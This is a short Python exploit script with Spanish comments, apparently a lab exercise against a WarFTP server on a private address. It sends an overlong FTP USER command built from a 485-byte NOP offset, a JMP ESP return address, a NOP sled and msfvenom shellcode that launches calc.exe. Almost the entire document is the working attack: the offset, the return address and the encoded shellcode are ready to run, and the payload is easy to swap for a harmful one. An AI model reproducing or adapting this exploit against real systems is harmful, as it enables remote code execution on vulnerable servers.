#!/usr/bin/python
# JMP ESP \xD7\x30\x6B\x7E
# buffer = "\x90" * 485 Cantidad resltado del offset
# buffer += "\x90" * 100  Nops para rellenar 

import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

buffer = "\x90" * 485
buffer += "\xD7\x30\x6B\x7E"     
buffer += "\x90" * 100  

# Metiendo la calculadora, msfvenom -a x86 --platform Windows -p windows/exec cmd=calc.exe -b '\x00\x0a\x0d\x20\x40' -f python

buf =  "\xcc"
buf += "\xdb\xdd\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x31\xb8\x7f"
buf += "\x9d\x15\x9b\x31\x42\x18\x03\x42\x18\x83\xc2\x7b\x7f"
buf += "\xe0\x67\x6b\xfd\x0b\x98\x6b\x62\x85\x7d\x5a\xa2\xf1"
buf += "\xf6\xcc\x12\x71\x5a\xe0\xd9\xd7\x4f\x73\xaf\xff\x60"
buf += "\x34\x1a\x26\x4e\xc5\x37\x1a\xd1\x45\x4a\x4f\x31\x74"
buf += "\x85\x82\x30\xb1\xf8\x6f\x60\x6a\x76\xdd\x95\x1f\xc2"
buf += "\xde\x1e\x53\xc2\x66\xc2\x23\xe5\x47\x55\x38\xbc\x47"
buf += "\x57\xed\xb4\xc1\x4f\xf2\xf1\x98\xe4\xc0\x8e\x1a\x2d"
buf += "\x19\x6e\xb0\x10\x96\x9d\xc8\x55\x10\x7e\xbf\xaf\x63"
buf += "\x03\xb8\x6b\x1e\xdf\x4d\x68\xb8\x94\xf6\x54\x39\x78"
buf += "\x60\x1e\x35\x35\xe6\x78\x59\xc8\x2b\xf3\x65\x41\xca"
buf += "\xd4\xec\x11\xe9\xf0\xb5\xc2\x90\xa1\x13\xa4\xad\xb2"
buf += "\xfc\x19\x08\xb8\x10\x4d\x21\xe3\x7e\x90\xb7\x99\xcc"
buf += "\x92\xc7\xa1\x60\xfb\xf6\x2a\xef\x7c\x07\xf9\x54\x72"
buf += "\x4d\xa0\xfc\x1b\x08\x30\xbd\x41\xab\xee\x81\x7f\x28"
buf += "\x1b\x79\x84\x30\x6e\x7c\xc0\xf6\x82\x0c\x59\x93\xa4"
buf += "\xa3\x5a\xb6\xc6\x22\xc9\x5a\x27\xc1\x69\xf8\x37"


buffer+= buf


s.connect(('10.0.2.16',21))
data = s.recv(1024)
print ("Enviando el WarFTP...")
s.send('USER '+buffer+'\r\n')
data = s.recv(1024)
s.send(' PASS PASSWORD '+'\r\n')
s.close()
print ("Final")
